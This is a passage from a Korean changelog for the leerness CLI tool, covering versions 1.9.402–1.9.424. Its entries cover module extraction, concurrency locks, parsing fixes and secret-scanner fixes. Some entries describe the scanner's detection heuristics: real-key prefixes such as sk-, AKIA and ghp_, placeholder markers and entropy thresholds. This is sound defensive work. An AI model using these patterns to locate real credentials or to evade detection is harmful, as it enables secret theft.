### 누적 효과 (UR-0125) — 6회 추출
bin **21,177 → 19,003줄(−2,174, 10.3%)**. lib/ 모듈 17개. 남은 최대: handoff(1434줄, 최고결합 — 별도 신중 다단계 작업 권장).

## 1.9.424 — 2026-06-07 — 무거움 점진 해소 5: agentsCmd → lib/agents.js 모듈화 (UR-0025/UR-0125)

**🪶 `bin/leerness.js` 무거움 점진 해소 5단계 — `agents` 오케스트레이션 핸들러(442줄)를 lib/ 로 DI 분리. bin이 2만 줄 아래로.**

### 변경
- `lib/agents.js` 신설(456줄): `agentsCmd(root, sub, args, deps)` — io는 `./io`, `EXTERNAL_AGENTS`는 `./agent-registry`, cp/path/fs 빌트인, harness 고유 의존 18종 DI 주입.
- **시그니처 `(root, sub, ...args)` → `(root, sub, args[], deps)`**: rest 인자를 배열로 받아 내부 재귀(`agents list`/`multi`)에 deps 전달. wrapper가 rest를 배열로 모아 전달. 동작 무변경.
- `bin/leerness.js`: 442줄 → **3줄 thin wrapper**. **20,008 → 19,588줄(−420)** — **2만 줄 아래 진입**.
- 기존 selftest(UR-0066 shell 주입 가드)의 agents 본문 검사를 lib/agents.js 참조로 갱신.

### 검증 (회귀 0)
- **selftest 169→170 PASS** (모듈 + DI 위임 + rest→array 시그니처 + 재귀 deps + UR-0066 lib 참조).
- **E2E 423→424 PASS** (agents list/check/quota/dispatch).

### 누적 효과 (UR-0125) — 5회 추출
bin **21,177 → 19,588줄(−1,589, 7.5%)**. lib/ 모듈 16개. 남은 최대: handoff(1434줄, 최고결합 — 별도 신중 작업) · sessionClose(599줄).

## 1.9.423 — 2026-06-07 — 무거움 점진 해소 4: healthCmd → lib/health.js 모듈화 (UR-0025/UR-0125)

**🪶 `bin/leerness.js` 무거움 점진 해소 4단계 — `health` 종합 진단 핸들러(334줄, 의존 최다)를 lib/ 로 DI 분리.**

### 배경
네 번째 큰 핸들러 추출. healthCmd는 drift/security/skill/usage/tasks/memory/featureGraph/roundHistory/milestones/recentChanges/pyFiles/envInfo/apiSkills/capabilityMatrix를 집계하는 **최다 의존(26종)** 핸들러. **사전 종합 의존 스캔**(drift 라운드 교훈)으로 전체 DI 목록을 일괄 확보 → **추출 첫 시도에 누락 deps 0**.

### 변경
- `lib/health.js` 신설(348줄): `healthCmd(root, deps)` — io는 `./io`, `_parseArchiveBlocks`는 `./pure-utils`, cp/os/path/fs 빌트인, harness 고유 의존 **26종 DI 주입**, `__filename`→`harnessPath`(drift spawn) 변환.
- `bin/leerness.js`: 334줄 → **3줄 thin wrapper**. **20,318 → 20,008줄(−310)**.
- 동작/출력 무변경(health 14 통합 필드 + --json + --strict 동일).

### 검증 (회귀 0)
- **selftest 168→169 PASS** (모듈 + DI 위임 + 본문 이동(capabilityMatrix) + healthy/checks 동작 — 첫 시도 통과).
- **E2E 422→423 PASS**.

### 누적 효과 (UR-0125) — 4회 추출
bin **21,177 → 20,008줄(−1,169, 5.5%)**. lib/ 모듈 15개. 남은 최대 후보: handoff(1434줄, 최고결합 — 별도 신중 작업).

## 1.9.422 — 2026-06-07 — 무거움 점진 해소 3: driftCheckCmd → lib/drift.js 모듈화 (UR-0025/UR-0125)

**🪶 `bin/leerness.js` 무거움 점진 해소 3단계 — `drift check` 핸들러(322줄, 내부 재귀 포함)를 lib/ 로 DI 분리.**

### 배경
세 번째 큰 핸들러 추출. driftCheckCmd는 **내부 재귀**(auto-fix 후 재검사) + **self-spawn**(audit --fix/session close) + 의존 16종으로 가장 복잡 → **테스트주도 추출**로 누락 deps를 단계적 포착(harnessPath→fs→taskLogPath/envDiff).

### 변경
- `lib/drift.js` 신설(334줄): `driftCheckCmd(root, opts, deps)` — io는 `./io`, fs/cp/path 빌트인, harness 고유 의존 16종 DI 주입. **내부 재귀 호출에 deps 전달**(`driftCheckCmd(root, opts, deps)`), `__filename`→`harnessPath`(self-spawn) 변환.
- `bin/leerness.js`: 322줄 → **3줄 thin wrapper**. **20,617 → 20,318줄(−299)**.
- 동작/출력 무변경(drift 4신호/4레벨 + --auto-fix 재귀 + handoff/health spawn 경로 동일).

### 검증 (회귀 0)
- **selftest 167→168 PASS** (모듈 + DI 위임 + 재귀 deps 전달 + level/score/fired 동작).
- **E2E 421→422 PASS** (drift check/--auto-fix + handoff·health의 drift spawn 경로).

### 누적 효과 (UR-0125)
3회 추출로 bin **21,177 → 20,318줄(−859, 4.1%)**. lib/ 모듈 14개. 다음 후보: healthCmd(~24) → handoff(1434).

## 1.9.421 — 2026-06-07 — 무거움 점진 해소 2: audit → lib/audit.js 모듈화 (UR-0025/UR-0125)

**🪶 `bin/leerness.js` 무거움 점진 해소 2단계 — `audit` 핸들러(310줄)를 lib/ 로 DI 분리.**

### 배경
1.9.420(review-request)에 이어 두 번째 큰 핸들러 추출. footprint 측정으로 audit(중심 명령이나 의존 추적 가능) 선정. **테스트주도 추출**: 추출 직후 audit text/--json 실행으로 누락 deps 즉시 검증(0건).

### 변경
- `lib/audit.js` 신설(322줄): `audit(root, opts, deps)` — io는 `./io`, SECRET_PATTERNS는 `./catalogs`, cp/path 빌트인, harness 고유 의존 11종(VERSION·arg·has·planPath·readProgressRows·currentStatePath·handoffPath·envDiff·_readFeatureGraph·_matchAPISkills·_listAPISkills) **DI 주입**.
- `bin/leerness.js`: 310줄 → **3줄 thin wrapper**. **20,903 → 20,617줄(−286)**.
- 동작/출력 무변경(meta/design/reuse/CVE/api-skill 감사 + --fix + --json 동일).

### 검증 (회귀 0)
- **selftest 166→167 PASS** (모듈 존재 + DI 위임 + 본문 이동(not_initialized finding kind) + healthy/findings 동작).
- **E2E 420→421 PASS** (audit는 gate/session-close/audit 케이스에서 핵심 검증).

### 누적 효과 (UR-0125)
2회 추출로 bin **21,177 → 20,617줄(−560, 2.6%)**. 다음 후보: driftCheck(~13) → healthCmd(~24) → handoff(1434).

## 1.9.420 — 2026-06-07 — 무거움 점진 해소: reviewRequestCmd → lib/review-request.js 모듈화 (UR-0025/UR-0125)

**🪶 `bin/leerness.js`(21k줄/1.3MB) 무거움 점진 해소 — `review-request` 핸들러(277줄)를 lib/ 로 DI 분리.**

### 배경
실현가능성 조사(3-에이전트)에서 무거움=MODERATE, 큰 핸들러 점진 추출 권장. 후보별 외부 의존 footprint 측정 결과 **reviewRequestCmd(285줄, 의존 최소)**가 최저 위험 → 첫 추출 대상으로 선정(안정성 우선).

### 변경
- `lib/review-request.js` 신설(288줄): `reviewRequestCmd(root, request, deps)` — io 프리미티브는 `./io`, `cp`/`path` 빌트인, harness 고유 의존(`has`·`harnessPath`·`_checkRequestConstraints`·`_recordRun`)은 **DI 주입**(기존 doctor/team/migrate/feature 패턴 동일).
- `bin/leerness.js`: 277줄 함수 → **3줄 thin wrapper** 위임. **21,177 → 20,903줄(−274)**.
- 동작/출력 **무변경**(텍스트·--json·빈입력 가드 동일).

### 검증 (회귀 0)
- **selftest 165→166 PASS** (모듈 존재 + DI 위임 + 인라인 제거 + estimatedType/recommendedSteps 동작).
- **E2E 419→420 PASS**.

### 무거움 진행 (UR-0125, 다음 라운드)
다음 추출 후보(의존 footprint 순): audit(~9) → driftCheck(~13) → healthCmd(~24) → handoff(1434줄, 최대/최고결합). 라운드마다 1개씩 안전 추출.

## 1.9.419 — 2026-06-07 — 엔트리 파일명 변경: bin/harness.js → bin/leerness.js (네이밍 일관성, UR-0126)

**📛 패키지 엔트리 파일명을 `bin/harness.js` → `bin/leerness.js` 로 변경 — 명령어(`leerness`)와 파일명 일치.**

### 배경
파일명 `harness.js` 는 초기 잔재로, 명령어/패키지명(`leerness`)과 불일치했습니다. 3-에이전트 실현가능성 조사 결과 **EASY/안전**(명령어는 이미 `leerness`, 내부 참조는 `__filename`/`path.resolve` 기반이라 자동 대응)으로 판정되어 실행.

### 변경
- `git mv bin/harness.js bin/leerness.js` (히스토리 보존).
- `package.json`: `bin.leerness` / `main` / npm scripts(test/test:fast/prepack) → `bin/leerness.js`.
- `scripts/e2e.js`(35건)·`scripts/smoke.js`·`.github/workflows/ci.yml`·`docs/PUBLISH_PRECHECK.md` 경로 참조 갱신.
- 내부 self-invocation/진단(`harnessPath: __filename`)·selftest(`read(__filename)`)는 런타임 자동 — 무변경.
- next-action 제안 문자열 1건 `node ./bin/harness.js whats-new` → `leerness whats-new`.

### 사용자 영향
**없음** — 설치/실행은 `leerness` 명령(불변). 파일을 직접 호출하지 않음. 기존 워크스페이스(.harness)·상태도 불변.

### 검증 (회귀 0)
- **selftest 164→165 PASS** (신규 구조 가드: bin 파일=leerness.js + package.json bin/main 일치).
- **E2E 418→419 PASS** (CLI 경로 변경 후 전체 스모크).

### 참고 (조사 결과 — 다음 라운드)
- harness.js 무거움(21k줄) → UR-0125 점진 모듈화(handoff 등 DI 추출).
- `.harness`→`.leerness` 폴더명 → UR-0127 **직접 변경 비권장**(기존 .leerness 상태 substrate 충돌) — 상태기판 격리(대안 A) 권장.

## 1.9.418 — 2026-06-07 — health 보안 정직화 + status "healthy" 의미 명시 (9번째 외부평가 Codex P2, UR-0121 잔여)

**🩺 `health`/`status` 의 "healthy" 가 프로젝트 안전을 뜻하는 듯 오해되던 것(Codex P2) 보강 — 정직성 일관 적용.**

### 배경
Codex: 같은 상태에서 `gate` 는 실패하는데 `health --json`/`status --json` 은 `healthy:true`. `health` 의 보안 점검은 `.env`/`.gitignore` 만 보고 하드코딩 시크릿을 무시(1.9.415 handoff 와 동일 근본원인), `status` 의 `healthy` 는 설치 파일 존재만 의미하나 라벨이 오해를 유발.

### 수정
- **health 보안 점검 정직화**: `_collectSecretFindings`(1.9.415 공유 헬퍼)로 **커밋 대상 하드코딩 시크릿**을 반영 → `checks.security.committedSecrets`/`critical` + `issues` + 최상위 `healthy` 에 전파. 시크릿이 있으면 `health` 가 `healthy:false`. `.env` 없어도 소스 스캔(기존엔 .env 없으면 보안 점검 스킵).
- **status 의미 명시**: `--json` 에 `scope:"install"` + `healthyMeaning`("설치 파일 존재 여부 — 프로젝트 안전은 gate/scan secrets 사용") 추가. `healthy` 의미(설치 완료)는 보존(비파괴).

### 검증 (회귀 0)
- **selftest 163→164 PASS** (health `_collectSecretFindings` 와이어 + status scope/meaning).
- **E2E 417→418 PASS** (시크릿 시 health healthy:false + committedSecrets + status scope:install + 클린 회귀).

### 9번째 외부평가 — 확정 발견 전부 소진
UR-0121(handoff/scan/encoding/contract + **health/status 라벨**) ✅ · UR-0122(add류) ✅ · UR-0123(contract field) ✅. 잔여는 전략 항목 UR-0124(init 프로파일/명령 계층화/handoff 속도/--compact) + team positional path(소소).

## 1.9.417 — 2026-06-07 — contract verify field 검증 범용화: ## Fields 섹션 불릿 인식 (9번째 외부평가, UR-0123)

**🔧 `contract verify` 의 필드 계약 검증이 `tick.` 프리픽스 전용으로 하드코딩돼 범용 spec 에서 무력화되던 것(Opus 발견) 보강.**

### 배경
Opus: `_parseContractSpec` 의 필드 추출이 `matchAll(/tick\.(name)/g)` 뿐(원래 TICK_SPEC 예제 잔재) → `## Fields` 아래 `- userId` 같은 일반 필드를 전혀 인식 못 해 "모든 필드 존재"로 항상 통과. 범용 명세↔구현 필드 검증이 사실상 불능.

### 수정
- `_parseContractSpec`: **`## Fields`(또는 `## 필드`) 섹션 한정**으로 불릿(`- name` / `* name: type` / `- name (설명)`)을 필드로 인식. 섹션 한정이라 산문 불릿 오탐 없음. 식별자 직후 `(` 면 함수로 보아 제외.
- 기존 `tick.X` 인식 + 함수 불릿(declared) 동작은 그대로(회귀 0).

### 검증 (회귀 0)
- **selftest 162→163 PASS** (Fields 섹션 인식 + Functions 불릿 필드 오인 방지 + `## 필드` 한글 + tick. 회귀).
- **E2E 416→417 PASS** (## Fields 누락 감지 exit 1 + 충족 시 통과).

### 9번째 외부평가 진행
UR-0121(handoff false-OK) ✅ · UR-0122(add류 일관성) ✅ · **UR-0123(contract field) ✅** · 잔여: team positional path / status 라벨 / init 프로파일·명령 계층화(UR-0124).

## 1.9.416 — 2026-06-07 — add류 CLI 인자 일관성: 경로 흡수 차단 + 빈 입력 거부 (9번째 외부평가, UR-0122)

**🧩 9번째 외부평가의 최강 UX 발견(3모델 공통: CLI 인자 규칙 불일치) 보강 — `task add`/`requests add`/`decision add` 의 제목 파싱을 단일 출처로 통일.**

### 배경
Sonnet P1 + Codex: `task add "제목" /some/path` 가 경로를 제목에 흡수("제목 /some/path")하던 반면 `decision add` 는 1.9.351(UR-0064)에서 이미 경로형 positional 을 차단. 같은 add 패러다임에서 동작이 갈려 혼란.

### 수정
- **`_parseAddTitle(args, startIdx)` 순수 헬퍼**(pure-utils): positional 을 join 하되 첫 `--flag` 또는 경로형 토큰(`/x`, `C:\x`, `./x`, `../x`)에서 멈춤 — **단일 출처**.
- `task add` / `requests add` / `decision add` 모두 이 헬퍼 사용 → 경로 흡수 일관 차단.
- **빈/경로-only 제목 거부**: `task add ""`, `task add /path` 등 → `failJson`(--json 시 `{ok:false,code:"empty_title"}`) + **exit 1**(기존엔 빈 task 생성). decision/requests add 동일.

### 검증 (회귀 0)
- **selftest 161→162 PASS** (_parseAddTitle 4 단위 + task/requests 와이어).
- **E2E 415→416 PASS** (경로 흡수 차단 + 빈/경로-only exit 1 + --json + requests 경로 break).

### 후속 백로그 (다음 라운드)
team add/show positional path 일관성(UR-0122 잔여) · status/health "healthy" 라벨(UR-0121 잔여) · contract field 범용화(UR-0123) · init 프로파일/명령 계층화(UR-0124).

## 1.9.415 — 2026-06-07 — 정직성 수정: handoff 보안 헤드라인 false-OK + scan/encoding/contract --json (9번째 외부평가, UR-0121)

**🚨 9번째 외부 멀티모델 리뷰(Codex GPT-5.5 + Claude Sonnet/Opus 4.8, README 미참조 클린룸)에서 발견한 "의미적 false-OK"를 수정 — leerness 정체성(정직/anti-laziness)과 정면 충돌하던 결함.**

### 배경
3개 모델이 깨끗한 경로에 leerness@latest 설치(README 제거) 후 직접 사용으로 객관 평가. 모든 발견을 직접 재현·검증(맹신 X)해 확정분만 수정.

### 수정 (확정 발견)
- **[Codex P1] handoff 보안 헤드라인 false-OK**: `handoff` 가 `.env` 가 `.gitignore` 에 있으면 무조건 "🔒 보안 OK" 출력 — **하드코딩된 시크릿이 있어도** 안전하다고 표시(scan secrets/gate 는 정확히 실패하는데 handoff 만 거짓 안심). 이제 실제 시크릿 스캔(`_collectSecretFindings`) 결과를 반영 → 커밋 대상 시크릿이 있으면 "🚨 시크릿 N건", 없을 때만 "🔒 보안 OK".
- **[Opus/Codex P2] `scan secrets` / `encoding check` --json 무시**: 두 명령이 `--json` 을 무시하고 텍스트만 출력(MCP/CI 파싱 불가) → 구조화 JSON + exit code 일관화.
- **[Opus P2] `contract verify --json` 불일치인데 exit 0**: `--json` 분기가 `process.exitCode=1` 보다 먼저 return → CI 가 계약 실패를 못 잡음. 불일치 시 exit 1.

### 검증 (회귀 0)
- **selftest 160→161 PASS** · **E2E 414→415 PASS**.

### 직접 재현으로 기각한 발견 (맹신 X)
- [Opus P1] contract verify 백틱 불릿 누락 → 이미 정상 작동(1.9.385 파서)으로 **기각**.
- [Sonnet] npm 패키지가 .harness 동봉 → 미동봉으로 **기각**.
- [Opus] route/gate/audit 동시성 손상 → Opus 자체 정정(파이프 아티팩트).

### 후속 백로그 (UR-0122~0124)
team add positional path 일관성 · status/health "healthy" 라벨 명확화 · contract field 범용화 · init 침습성/명령 계층화/handoff 속도/--compact 압축.

## 1.9.414 — 2026-06-07 — 에이전트 팀에 "메인 검수" 단계 (서브에이전트 검수 통합, UR-0119/0120)

**🤝 team 에 `--review`(메인 에이전트 검수 요구) 추가 — "분배(sub-agent) → 메인 검수" 흐름을 팀 정의에 일급으로 통합.**

### 배경 (사용자 체크 요청 → 갭 보강)
사용자 확인 요청: "서브에이전트 자동화 + 메인 에이전트 검수 과정이 구현돼 있는지". 조사 결과 분배(agents dispatch/team) + 검증(verify-claim/review) + session-workflow Step5(교차검증)는 있으나, **팀 정의에 "메인 검수 필수"가 일급으로 없었음**. team 에 review 필드를 추가해 통합.

### 구현
- `team add ... [--no-review]`: 팀에 `review` 필드(기본 on). `--no-review` 로 끔.
- `_composeTeamPlan`: review 시 멤버별 dispatch 단계 뒤에 **메인 검수 단계(reviewStep)** 추가 — `verify-claim --strict-claims` / `review --persona` 안내.
- `team preview`: 분배 계획 + "✔ 메인 검수 (필수)" 표시(+ --json reviewStep).
- `_teamHandoffReminders`: 스케줄 팀에 "· 검수필요" 표시.
- show/`_renderTeamsMd`: review 상태 표기.

### 검증 (회귀 0)
- **selftest 159→160 PASS** (_composeTeamPlan reviewStep on/off + handoff 검수필요 + team add 와이어).
- **E2E 413→414 PASS** (preview 메인 검수 표시 + --no-review 생략 + --json reviewStep).

## 1.9.413 — 2026-06-07 — action 명령 --json 구조화 출력 (6번째 외부평가 codex P2, UR-0101)

**🔌 자동화 일관성 완결 — task/decision/rule/lesson add 가 `--json` 을 무시하고 텍스트만 내던 것을 구조화 JSON 출력으로.**

### 배경 (6번째 외부평가 codex P2 / 2차 버그헌트 #9)
read 명령(list/show)은 --json JSON 을 내지만 action(쓰기) 명령은 --json 을 무시하고 `✓ task added: T-0002` 텍스트만 출력 → 외부 AI 가 결과를 구조화 파싱 못 함. 핵심 4개 memory-write action 에 --json 추가.

### 구현
- task add → `{ok,id,status,request}`, decision add → `{ok,title}`, rule add → `{ok,id,trigger,rule,skipped}`, lesson save → `{ok,text,tag}`.
- 코어 데이터 영속 후 JSON 1줄 출력 + return(사람용 ok 및 cosmetic auto-roadmap/interactive review-trigger 스킵 → stdout 오염 없음). --json 미사용 시 기존 텍스트 동작 불변.

### 검증 (회귀 0)
- **selftest 158→159 PASS** (4개 action JSON 출력 와이어).
- **E2E 351→352 PASS** (4개 --json → {ok:true} + 데이터 영속 + 사람용 텍스트 보존).

## 1.9.412 — 2026-06-07 — list-family positional path 지원 (6번째 외부평가 Opus P1, UR-0100)

**🧭 일관성 footgun 수정 — decision/feature/plan/runs/team `list` 이 positional path 를 조용히 무시하고 cwd 를 읽던 것을 positional 지원으로.**

### 배경 (6번째 외부평가 Opus P1 · 맹신 X로 재검증)
status/audit/handoff 는 `[path]` positional 을 지원하나, list-family(decision/feature/plan/runs/team list)는 `--path` 만 받고 positional 을 무시 → `leerness decision list ./proj` 가 조용히 cwd 를 읽어 **다른 데이터** 반환(에러 없음 = silent-wrong footgun). 직접 재현 확인(positional=0, --path=1).

### 구현
- 각 list 브랜치 root 해석을 기존 헬퍼 `_resolveRoot(positional)`(--path > positional > cwd)로 전환: `absRoot(_resolveRoot(args[2]))`. team 은 `sub==='list'` 일 때만(preview/deploy 의 args[2]=id 와 분리).
- add/show/drop/preview 의 positional(title/id)은 별도 브랜치라 불변(회귀 0).

### 검증 (회귀 0)
- **selftest 157→158 PASS** (5개 list 디스패치 _resolveRoot 와이어).
- **E2E 350→351 PASS** (decision/feature list positional → 해당 워크스페이스 데이터 + --path 보존 + add title/show id 회귀 없음).

## 1.9.411 — 2026-06-07 — lazy detect --auto-track 배치화 O(N²)→O(N) (8번째 버그헌트, UR-0115)

**⚡ 성능 — `lazy detect --auto-track` 가 TODO 마다 progress-tracker 전체 read-modify-write 하던 O(T×N) 을 단일 RMW O(N+T) 로.**

### 배경 (2차 버그헌트 ReDoS/perf 차원)
`--auto-track` 은 새 TODO 마다 `nextId`(plan+progress 전체 스캔) + `upsertProgress`(락+전체 read+write)를 호출 → T개 TODO 시 O(T × tracker크기). AI 가 생성/대량 코드에 실행 시 다수 TODO 자동등록이 느려짐(병리적 입력에서 행걸림).

### 구현
- 락 1회 안에서 rows 1회 읽기 → 최대 T-id 1회 계산 → 전부 push → 1회 write. 순차 ID·필드·멱등 동작 보존(동시성 안전 _withLock 유지).

### 검증 (회귀 0)
- **selftest 156→157 PASS** (배치 구조 + per-TODO upsert 제거 확인).
- **E2E 349→350 PASS** (6 TODO --auto-track 순차 ID 무중복 등록).
- 실측: 8 TODO → T-0002~0009 순차, 단일 RMW.

## 1.9.410 — 2026-06-07 — 값 없는 --path raw TypeError 크래시 차단 (8번째 버그헌트, UR-0114)

**🛡 견고성 — `--path`(값 없이) 같은 비-문자열 인자가 `path.resolve(true)` raw Node TypeError 로 크래시하던 것을 cwd 폴백으로 차단.**

### 배경 (2차 버그헌트 arg-boundary)
값 없는 `--path` 플래그는 `arg()` 가 boolean `true` 를 반환 → `absRoot(p) = path.resolve(p || cwd)` 에서 `true || cwd = true`(truthy) → `path.resolve(true)` → "The paths[0] argument must be of type string. Received type boolean (true)" raw 크래시. absRoot 를 쓰는 모든 명령(status/audit/handoff/…)에 영향.

### 구현
- `absRoot(p)`: `(typeof p === 'string' && p.trim()) ? p : process.cwd()` — 비-문자열/빈/공백 입력은 cwd 폴백(`--path=` 빈값 동작과 일관). 실제 문자열 경로는 그대로 보존.

### 검증 (회귀 0)
- **selftest 155→156 PASS** (true/''/undefined/공백 → cwd, 실경로 보존 5케이스).
- **E2E 348→349 PASS** (`status --path` raw TypeError 누출 안 됨 + cwd 폴백 정상 실행).

## 1.9.409 — 2026-06-07 — encoding-check --apply 가 .sh/shebang 깨뜨리던 것 차단 (8번째 버그헌트, UR-0113)

**🐚 인코딩 도구 자기모순 수정 — `env encoding-check --apply` 가 .sh(shebang) 파일에 BOM 을 추가해 스크립트 실행을 깨뜨리던 것 차단.**

### 배경 (2차 버그헌트 encoding 차원)
`--apply` 는 비-ASCII + no-BOM "위험" 파일에 UTF-8 BOM 을 추가하는데, `.sh`(예: `#!/bin/bash`) 에 BOM(EF BB BF)이 shebang 앞에 붙으면 커널이 `#!` 를 인식 못 해 스크립트 실행 불가. leerness 자체 인코딩 도구가 .sh 를 깨뜨리는 모순.

### 구현
- `--apply` 루프: `.sh` 확장자 또는 첫 2바이트가 `#!`(shebang)인 파일은 BOM 추가 스킵(`action: skipped-shebang`). .ps1/.bat 등은 기존대로 BOM 추가.

### 검증 (회귀 0)
- **selftest 154→155 PASS** (.sh shebang 보존 + .ps1 BOM 추가 행위검증).
- **E2E 347→348 PASS** (CLI --apply: .sh 첫바이트 `#!` 보존(BOM 없음) + .ps1 BOM 추가).

## 1.9.408 — 2026-06-07 — CRLF/CR SKILL.md frontmatter 파싱 복구 (8번째 버그헌트, UR-0112)

**🪟 Windows 호환 — CRLF/CR 줄바꿈의 SKILL.md frontmatter 가 통째로 소실돼 `skill install` 이 "name 필수" 로 실패하던 것 수정.**

### 배경 (2차 버그헌트 encoding 차원 · Windows 직격)
`_parseSkillMd` 의 frontmatter 값 정규식 `(.+)$` 의 `.` 은 CR(`\r`)을 매칭하지 못함 → `name: x\r` 라인이 통째로 매칭 실패 → CRLF SKILL.md(Windows/Notepad 기본)의 meta 가 `{}` 로 소실 → `skill install` 이 frontmatter 의 name 을 못 찾아 "name 필수" 로 실패. 직접 재현: LF 는 정상, CRLF 는 meta={}.

### 구현
- `_parseSkillMd` 상단에서 BOM strip 후 `replace(/\r\n?/g, '\n')` 로 CRLF/CR → LF 정규화. 모든 줄바꿈 스타일(LF/CRLF/CR/BOM+CRLF) 동일 파싱.

### 검증 (회귀 0)
- **selftest 153→154 PASS** (LF/CRLF/CR/BOM+CRLF 4종 meta 파싱).
- **E2E 346→347 PASS** (CRLF SKILL.md `skill install` exit0 + skill list 에 등록 확인).

## 1.9.407 — 2026-06-07 — MCP feature_link 권한경계 + NaN --limit 가드 (8번째 버그헌트, UR-0111)

**🛡 MCP 권한경계 — read-only로 잘못 선언된 그래프-변경 도구 수정 + NaN --limit 가 결과를 조용히 숨기던 것 차단.**

### 배경 (2차 버그헌트 mcp-parity/arg-boundary)
- **feature_link**: `requiredTier: 'read-only'` 인데 실제로는 feature 그래프에 엣지를 **추가(mutate)** → read-only tier로 제한된 에이전트가 예기치 않게 상태 변경 가능(권한경계 위반). 형제 `feature_add` 는 올바르게 `safe-write`. (감사: read-only 59종 중 mutation 키워드 7건 의심 → 비판검토로 feature_link 만 진짜, 나머지는 조회/등록된/DELETE archive 등 read 문맥 false-positive.)
- **NaN --limit**: `--limit abc` → `parseInt('abc')=NaN` → `slice(0,NaN)=[]` → 모든 결과를 조용히 숨김(음수/0도 동일).

### 구현
- feature_link `requiredTier` → `safe-write` (feature_add 와 일관).
- `_parseLimit(raw, def)` 순수 헬퍼(NaN/음수/0 → 기본값) → lessons/memory search/reuse find/lsp search 4개 호출부 적용.

### 검증 (회귀 0)
- **selftest 152→153 PASS** (_parseLimit 5케이스 + feature_link safe-write tier).
- **E2E 345→346 PASS** (feature_link tier + lessons --limit abc 결과 은폐 안 됨).

## 1.9.406 — 2026-06-07 — rule/decision/lesson add 동시쓰기 lost-update 차단 (8번째 버그헌트, UR-0110)

**🔒 멀티에이전트 데이터 무결성 — rule/decision/lesson add 의 read-modify-write 가 락 없이 실행돼 동시 쓰기 시 항목이 조용히 유실되던 것 차단(UR-0043 락 정책의 커버리지 갭 메움).**

### 배경 (2차 버그헌트 concurrency 차원)
1.9.303(UR-0043)이 task/plan add 의 동시 lost-update 를 _withLock 으로 막았으나, rule add / decision add / lesson save 는 누락. 2차 버그헌트가 실측 재현: 14개 동시 rule add → 11~13개만 잔존(2~3개 영구 유실), 12 동시 decision add → 10개. atomic write 라 파일은 무손상이나 개수 무결성 깨짐(늦은 writer 가 이른 항목 덮어씀).

### 구현
- ruleAdd / decisionAdd / lessonSave 의 RMW 전체를 `_withLock(rulesPath/decisionsJsonPath/lessonsJsonPath, () => {...})` 로 직렬화(task add 와 동일 패턴). ruleAdd 는 멱등 skip 을 락 내 반환값으로 처리.

### 검증 (회귀 0)
- **selftest 151→152 PASS** (3함수 _withLock 와이어).
- **E2E 344→345 PASS** (락 리팩터 멱등성/정확성 보존: dup skip + 순차 카운트).
- 실측 동시성: 14 rule / 12 decision / 10 lesson 동시 add → 전부 무손실 + stale lock 없음.

## 1.9.405 — 2026-06-07 — 시크릿 placeholder FP 회귀수정 (8번째 버그헌트, UR-0109)

**🔧 자기 회귀 수정 — 1.9.401 의 looksReal 가드가 긴 서술형 placeholder를 실키로 오탐(FP)하던 것 차단.**

### 배경 (2차 버그헌트가 1.9.401 회귀 발견 — "맹신 X"가 자기 수정도 검증)
1.9.401 이 'sk-EXAMPLE..' 같은 실키 FN 을 고치려 entropy 가드(영숫자24+ & 고유12+)를 추가했는데, `your-super-secret-api-key-example-value`(len 33, 고유 16) 같은 긴 서술형 placeholder 가 가드를 넘어 실키로 오탐(FP) → .env.example 의 명백한 placeholder 를 시크릿으로 잘못 보고. 2차 적대적 버그헌트가 직접 재현 검출.

### 구현
- `_isPlaceholderSecret` 순서 재정렬: ① 실키 prefix(sk-/AKIA/ghp_ 등) → 실키(마커 무시, FN 방지). ② placeholder 마커 단어(example/your-/changeme/<…) 있으면 → placeholder(고엔트로피여도, FP 방지). ③ prefix·마커 없는 고엔트로피 → 실키.

### 검증 (회귀 0)
- **selftest 150→151 PASS** (긴 서술형 placeholder 3종 FP 차단 + sk- 실키 2종 FN 유지 + 고엔트로피 실키 + 짧은 placeholder).
- **E2E 343→344 PASS** (서술형 placeholder cfg.txt → exit0 미탐 / sk-proj-EXAMPLE 실키 → exit1 탐지).
- 실측 9/9.

## 1.9.404 — 2026-06-07 — reuse autodetect / creds check --json 에러 구조화 (7번째 버그헌트 P2, UR-0105 잔여)

**🔌 reuse autodetect / creds check 의 빈·에러 --json 경로도 구조화 JSON — failJson 와이어 확대.**

### 배경
버그헌트가 여러 명령의 --json 에러 누출을 지적. UR-0099/0105 에서 핵심(contract/feature/anti-laziness)을 고쳤고, 이번에 reuse autodetect(스캔 디렉토리 없음)·creds check(등록 서비스 없음)를 추가.

### 구현
- reuse autodetect: `no_scan_dir`, creds check: `no_service` 를 `failJson(has('--json'), ...)` 로. 사람용 출력 보존.

### 검증 (회귀 0)
- **selftest 149→150 PASS** + **E2E 342→343 PASS** (reuse/creds --json → {ok:false,code} + 사람용 텍스트 보존).

## 1.9.403 — 2026-06-07 — api-skill 에러 exit code 1 (7번째 버그헌트 P2, UR-0107)

**🚦 api-skill show/drop 의 실패가 성공(exit 0)으로 보고되던 것 수정 — AI 에이전트의 exit-code 게이트 신뢰성.**

### 배경 (7번째 버그헌트 P2 · 비판검토 후 선별)
버그헌트가 여러 exit-code 비일관을 지적. 직접 재현 + **비판 판단**:
- **수정(명확)**: api-skill show/drop 없는 ID + 인자 누락이 `✗ ...` 출력하면서 exit 0 → 실패를 성공으로 오판(데이터 op 에러). exit 1 로 수정.
- **미수정(by-design 판단)**: roles/policy/state 의 unknown-subcommand 가 catalog(default list)를 보여주며 exit 0 → `cmd`(no sub)와 동일한 lenient-default 라 defensible. 과엄격 변경 위험으로 제외. web/pc check 의 "미설치" exit 0 도 opt-in 정보성이라 정당(미수정).

### 구현
- api-skill show(id 누락/not-found), drop(id 누락/not-found), add(url 누락) 에러에 `process.exitCode = 1` 추가. 정상 list/show 는 exit 0 보존.

### 검증 (회귀 0)
- **selftest 148→149 PASS** (api-skill show/drop/add 에러 exit-code 와이어).
- **E2E 341→342 PASS** (show/drop NOPE + show id누락 → exit1, list → exit0).

## 1.9.402 — 2026-06-07 — decisions/lessons MD projection 개행 주입 차단 (7번째 버그헌트 P1-A 잔여, UR-0108)

**🛡 데이터 무결성 완결 — decision/lesson 텍스트의 개행이 decisions.md/lessons.md projection 에 위조 블록을 주입하던 것 차단(테이블셀 injection 클러스터 마무리).**

### 배경
1.9.399 가 progress-tracker/rules(파이프 테이블)를 보호. decisions/lessons 는 canonical JSON(raw 안전) + MD projection(`### date — title` / `- field:`) 인데, title/text 의 개행이 MD projection 에 가짜 `### ` 블록을 주입 → JSON 부재(MD-fallback) 시 위조 결정/레슨 증식. 직접 재현 확인(### 4개).

### 구현
